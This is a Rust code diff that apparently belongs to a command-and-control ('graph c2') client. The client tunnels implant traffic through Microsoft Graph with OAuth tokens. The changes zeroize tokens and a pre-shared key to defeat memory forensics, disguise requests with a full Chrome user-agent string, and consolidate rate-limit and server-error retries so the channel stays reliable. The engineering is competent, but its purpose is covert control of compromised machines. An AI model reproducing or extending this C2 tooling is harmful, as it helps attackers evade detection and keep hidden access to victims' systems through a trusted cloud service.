@@ -231,6 +231,17 @@ impl Default for GraphC2Config {
     }
 }
 
+/// MED-011: Zeroize sensitive fields (tokens, PSK) when config is dropped.
+impl Drop for GraphC2Config {
+    fn drop(&mut self) {
+        zeroize_string(&mut self.access_token);
+        if let Some(ref mut rt) = self.refresh_token {
+            zeroize_string(rt);
+        }
+        zeroize_string(&mut self.psk);
+    }
+}
+
 // ── Authentication ───────────────────────────────────────────────────────────
 
 /// OAuth 2.0 token response from Entra ID token endpoint.
@@ -248,6 +259,16 @@ struct TokenEndpointResponse {
 
 fn default_token_type() -> String {
     "Bearer".to_string()
+}
+
+/// MED-011: Zeroize `TokenEndpointResponse` sensitive fields after use.
+impl Drop for TokenEndpointResponse {
+    fn drop(&mut self) {
+        zeroize_string(&mut self.access_token);
+        if let Some(ref mut rt) = self.refresh_token {
+            zeroize_string(rt);
+        }
+    }
 }
 
 /// Authenticated Graph API client with automatic token refresh.
@@ -274,6 +295,10 @@ pub struct GraphClient {
 
 /// Atomic token pair: all three fields are updated together during a refresh
 /// so no caller can ever observe a mix of old and new credentials.
+///
+/// **MED-011:** Implements `Drop` to zeroize access and refresh tokens so
+/// they don't remain in freed heap memory where they could be recovered
+/// by a memory forensics tool.
 #[derive(Debug, Clone)]
 struct TokenPair {
     /// Current access token.
@@ -282,6 +307,34 @@ struct TokenPair {
     refresh_token: Option<String>,
     /// Absolute time when the current access token expires.
     token_expiry: Instant,
+}
+
+impl Drop for TokenPair {
+    fn drop(&mut self) {
+        // Zeroize the access token bytes using volatile writes to prevent
+        // the compiler from optimizing away the zeroing.
+        zeroize_string(&mut self.access_token);
+        if let Some(ref mut rt) = self.refresh_token {
+            zeroize_string(rt);
+        }
+    }
+}
+
+/// Zeroize a `String` in-place using volatile writes (MED-011).
+///
+/// Overwrites every byte of the string's buffer with zero before dropping.
+/// Uses `write_volatile` to prevent the compiler from eliding the writes.
+fn zeroize_string(s: &mut String) {
+    unsafe {
+        let bytes = s.as_bytes_mut();
+        for byte in bytes.iter_mut() {
+            std::ptr::write_volatile(byte, 0);
+        }
+    }
+    // Prevent LLVM from reusing the zeroed allocation for the new empty
+    // string — truncate first, then clear capacity.
+    s.clear();
+    s.shrink_to_fit();
 }
 
 impl GraphClient {
@@ -300,7 +353,7 @@ impl GraphClient {
         custom_graph_url: Option<&str>,
     ) -> Self {
         let http_client = reqwest::Client::builder()
-            .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
+            .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36")
             .build()
             .expect("failed to build reqwest client");
 
@@ -494,198 +547,229 @@ impl GraphClient {
 
     /// Build an authenticated GET request to the Graph API.
     ///
-    /// Retries automatically on transient 5xx server errors (MED-002).
+    /// Retries automatically on transient 5xx server errors (MED-002) and
+    /// HTTP 429 rate-limit responses (MED-012).
     async fn get(&mut self, path: &str) -> Result<reqwest::Response> {
         self.refresh_access_token().await?;
         let url = format!("{}{}", self.graph_base_url(), path);
         let token = self.tokens.access_token.clone();
         let client = &self.http_client;
-        let resp = self
-            .retry_on_server_error(|| {
-                let url = url.clone();
-                let token = token.clone();
-                async move {
-                    client
-                        .get(&url)
-                        .header("Authorization", format!("Bearer {}", token))
-                        .header("Content-Type", "application/json")
-                        .send()
-                        .await
-                        .context("Graph API GET error")
-                }
-            })
-            .await?;
-        self.handle_rate_limit(resp).await
+        self.with_retry(|| {
+            let url = url.clone();
+            let token = token.clone();
+            async move {
+                client
+                    .get(&url)
+                    .header("Authorization", format!("Bearer {}", token))
+                    .header("Content-Type", "application/json")
+                    .send()
+                    .await
+                    .context("Graph API GET error")
+            }
+        })
+        .await
     }
 
     /// Build an authenticated POST request to the Graph API.
     ///
     /// The body is serialized to JSON bytes before the retry loop so that
-    /// it can be replayed on transient 5xx errors (MED-002).
+    /// it can be replayed on transient 5xx errors (MED-002) and rate-limit
+    /// errors (MED-012).
     async fn post(&mut self, path: &str, body: impl Serialize) -> Result<reqwest::Response> {
         self.refresh_access_token().await?;
         let url = format!("{}{}", self.graph_base_url(), path);
         let json_bytes = serde_json::to_vec(&body).context("Graph API POST serialize error")?;
         let token = self.tokens.access_token.clone();
         let client = &self.http_client;
-        let resp = self
-            .retry_on_server_error(|| {
-                let url = url.clone();
-                let token = token.clone();
-                let json_bytes = json_bytes.clone();
-                async move {
-                    client
-                        .post(&url)
-                        .header("Authorization", format!("Bearer {}", token))
-                        .header("Content-Type", "application/json")
-                        .body(json_bytes)
-                        .send()
-                        .await
-                        .context("Graph API POST error")
-                }
-            })
-            .await?;
-        self.handle_rate_limit(resp).await
+        self.with_retry(|| {
+            let url = url.clone();
+            let token = token.clone();
+            let json_bytes = json_bytes.clone();
+            async move {
+                client
+                    .post(&url)
+                    .header("Authorization", format!("Bearer {}", token))
+                    .header("Content-Type", "application/json")
+                    .body(json_bytes)
+                    .send()
+                    .await
+                    .context("Graph API POST error")
+            }
+        })
+        .await
     }
 
     /// Build an authenticated PUT request to the Graph API (for file upload).
     ///
     /// The body bytes are cloned for each retry attempt on transient 5xx
-    /// errors (MED-002).
+    /// errors (MED-002) and rate-limit errors (MED-012).
     async fn put_binary(&mut self, path: &str, data: Vec<u8>) -> Result<reqwest::Response> {
         self.refresh_access_token().await?;
         let url = format!("{}{}", self.graph_base_url(), path);
         let token = self.tokens.access_token.clone();
         let client = &self.http_client;
-        let resp = self
-            .retry_on_server_error(|| {
-                let url = url.clone();
-                let token = token.clone();
-                let data = data.clone();
-                async move {
-                    client
-                        .put(&url)
-                        .header("Authorization", format!("Bearer {}", token))
-                        .header("Content-Type", "application/octet-stream")
-                        .body(data)
-                        .send()
-                        .await
-                        .context("Graph API PUT error")
-                }
-            })
-            .await?;
-        self.handle_rate_limit(resp).await
+        self.with_retry(|| {
+            let url = url.clone();
+            let token = token.clone();
+            let data = data.clone();
+            async move {
+                client
+                    .put(&url)
+                    .header("Authorization", format!("Bearer {}", token))
+                    .header("Content-Type", "application/octet-stream")
+                    .body(data)
+                    .send()
+                    .await
+                    .context("Graph API PUT error")
+            }
+        })
+        .await
     }
 
     /// Build an authenticated PATCH request to the Graph API.
     ///
     /// The body is serialized to JSON bytes before the retry loop so that
-    /// it can be replayed on transient 5xx errors (MED-002).
+    /// it can be replayed on transient 5xx errors (MED-002) and rate-limit
+    /// errors (MED-012).
     async fn patch(&mut self, path: &str, body: impl Serialize) -> Result<reqwest::Response> {
         self.refresh_access_token().await?;
         let url = format!("{}{}", self.graph_base_url(), path);
         let json_bytes = serde_json::to_vec(&body).context("Graph API PATCH serialize error")?;
         let token = self.tokens.access_token.clone();
         let client = &self.http_client;
-        let resp = self
-            .retry_on_server_error(|| {
-                let url = url.clone();
-                let token = token.clone();
-                let json_bytes = json_bytes.clone();
-                async move {
-                    client
-                        .patch(&url)
-                        .header("Authorization", format!("Bearer {}", token))
-                        .header("Content-Type", "application/json")
-                        .body(json_bytes)
-                        .send()
-                        .await
-                        .context("Graph API PATCH error")
-                }
-            })
-            .await?;
-        self.handle_rate_limit(resp).await
+        self.with_retry(|| {
+            let url = url.clone();
+            let token = token.clone();
+            let json_bytes = json_bytes.clone();
+            async move {
+                client
+                    .patch(&url)
+                    .header("Authorization", format!("Bearer {}", token))
+                    .header("Content-Type", "application/json")
+                    .body(json_bytes)
+                    .send()
+                    .await
+                    .context("Graph API PATCH error")
+            }
+        })
+        .await
     }
 
     /// Build an authenticated DELETE request to the Graph API.
     ///
-    /// Retries automatically on transient 5xx server errors (MED-002).
+    /// Retries automatically on transient 5xx server errors (MED-002) and
+    /// rate-limit errors (MED-012).
     async fn delete(&mut self, path: &str) -> Result<reqwest::Response> {
         self.refresh_access_token().await?;
         let url = format!("{}{}", self.graph_base_url(), path);
         let token = self.tokens.access_token.clone();
         let client = &self.http_client;
-        let resp = self
-            .retry_on_server_error(|| {
-                let url = url.clone();
-                let token = token.clone();
-                async move {
-                    client
-                        .delete(&url)
-                        .header("Authorization", format!("Bearer {}", token))
-                        .send()
-                        .await
-                        .context("Graph API DELETE error")
-                }
-            })
-            .await?;
-        self.handle_rate_limit(resp).await
+        self.with_retry(|| {
+            let url = url.clone();
+            let token = token.clone();
+            async move {
+                client
+                    .delete(&url)
+                    .header("Authorization", format!("Bearer {}", token))
+                    .send()
+                    .await
+                    .context("Graph API DELETE error")
+            }
+        })
+        .await
     }
 
-    /// Handle HTTP 429 (Too Many Requests) rate limiting.
+    /// Combined retry loop for both 5xx server errors (MED-002) and
+    /// HTTP 429 rate-limit responses (MED-012).
     ///
-    /// On 429, reads the `Retry-After` header and sleeps for the indicated
-    /// duration before returning the response. The caller should check the
-    /// status code and handle non-success responses appropriately.
-    async fn handle_rate_limit(&self, resp: reqwest::Response) -> Result<reqwest::Response> {
-        if resp.status() == reqwest::StatusCode::TOO_MANY_REQUESTS {
-            let retry_after = resp
-                .headers()
-                .get("Retry-After")
-                .and_then(|v| v.to_str().ok())
-                .and_then(|v| v.parse::<u64>().ok())
-                .unwrap_or(RATE_LIMIT_BACKOFF_SECS);
-            tracing::warn!("graph c2: rate limited (429), sleeping {}s", retry_after);
-            tokio::time::sleep(Duration::from_secs(retry_after)).await;
-        }
-        Ok(resp)
-    }
-
-    /// Retry a request closure on transient 5xx server errors (MED-002).
+    /// Executes the provided async closure and retries on:
+    /// - **5xx**: up to `MAX_5XX_RETRIES` times with exponential backoff
+    /// - **429**: up to `MAX_RATE_LIMIT_RETRIES` times, respecting the
+    ///   `Retry-After` header (or falling back to `RATE_LIMIT_BACKOFF_SECS`)
     ///
-    /// Executes the provided async closure and retries up to
-    /// [`MAX_5XX_RETRIES`] times with exponential backoff starting at
-    /// [`SERVER_ERROR_BACKOFF_SECS`] seconds.  Returns the first non-5xx
-    /// response, or the last 5xx response if all retries are exhausted.
-    async fn retry_on_server_error<F, Fut>(&self, mut do_request: F) -> Result<reqwest::Response>
+    /// Returns `Ok(resp)` on success, or `Err` when retries are exhausted
+    /// so callers can distinguish transient exhaustion from genuine success.
+    async fn with_retry<F, Fut>(&self, mut do_request: F) -> Result<reqwest::Response>
     where
         F: FnMut() -> Fut,
         Fut: std::future::Future<Output = Result<reqwest::Response>>,
     {
-        let mut attempt: u32 = 0;
+        let mut server_error_attempts: u32 = 0;
+        let mut rate_limit_attempts: u32 = 0;
+
         loop {
             let resp = do_request().await?;
-            if !resp.status().is_server_error() {
+            let status = resp.status();
+
+            // Success — return immediately.
+            if status.is_success() {
                 return Ok(resp);
             }
-            attempt += 1;
-            if attempt >= MAX_5XX_RETRIES {
+
+            // 429 Too Many Requests — respect Retry-After header and retry.
+            if status == reqwest::StatusCode::TOO_MANY_REQUESTS {
+                rate_limit_attempts += 1;
+                if rate_limit_attempts > MAX_RATE_LIMIT_RETRIES {
+                    tracing::warn!(
+                        "graph c2: rate limited (429) after {} retries, giving up",
+                        rate_limit_attempts
+                    );
+                    // Return Err so callers know this is a permanent failure,
+                    // not a successful response.
+                    bail!(
+                        "graph c2: rate limited (429) after {} retries, last status={}",
+                        rate_limit_attempts,
+                        status
+                    );
+                }
+                let retry_after = resp
+                    .headers()
+                    .get("Retry-After")
+                    .and_then(|v| v.to_str().ok())
+                    .and_then(|v| v.parse::<u64>().ok())
+                    .unwrap_or(RATE_LIMIT_BACKOFF_SECS);
                 tracing::warn!(
-                    "graph c2: server error {} after {} retries, giving up",
-                    resp.status(),
-                    attempt
+                    "graph c2: rate limited (429), attempt {}/{}, sleeping {}s then retrying",
+                    rate_limit_attempts,
+                    MAX_RATE_LIMIT_RETRIES,
+                    retry_after,
                 );
-                return Ok(resp);
+                tokio::time::sleep(Duration::from_secs(retry_after)).await;
+                continue;
             }
-            let backoff = SERVER_ERROR_BACKOFF_SECS * (1 << attempt);
-            tracing::warn!(
-                "graph c2: server error {} (attempt {}/{}), retrying in {}s",
-                resp.status(),
-                attempt,
-                MAX_5XX_RETRIES,
-                backoff
-            );
-            tokio::time::sleep(Duration::from_secs(backoff)).await;
+
+            // 5xx server error — exponential backoff and retry.
+            if status.is_server_error() {
+                server_error_attempts += 1;
+                if server_error_attempts > MAX_5XX_RETRIES {
+                    tracing::warn!(
+                        "graph c2: server error {} after {} retries, giving up",
+                        status,
+                        server_error_attempts
+                    );
+                    // Return Err so callers know this is a permanent failure,
+                    // not a successful response.
+                    bail!(
+                        "graph c2: server error {} after {} retries",
+                        status,
+                        server_error_attempts
+                    );
+                }
+                let backoff = SERVER_ERROR_BACKOFF_SECS * (1 << (server_error_attempts - 1));
+                tracing::warn!(
+                    "graph c2: server error {} (attempt {}/{}), retrying in {}s",
+                    status,
+                    server_error_attempts,
+                    MAX_5XX_RETRIES,
+                    backoff,
+                );
+                tokio::time::sleep(Duration::from_secs(backoff)).await;
+                continue;
+            }
+
+            // Non-retryable error (4xx except 429) — return as-is so the
+            // caller can inspect the status code and body.
+            return Ok(resp);
         }
     }
 }
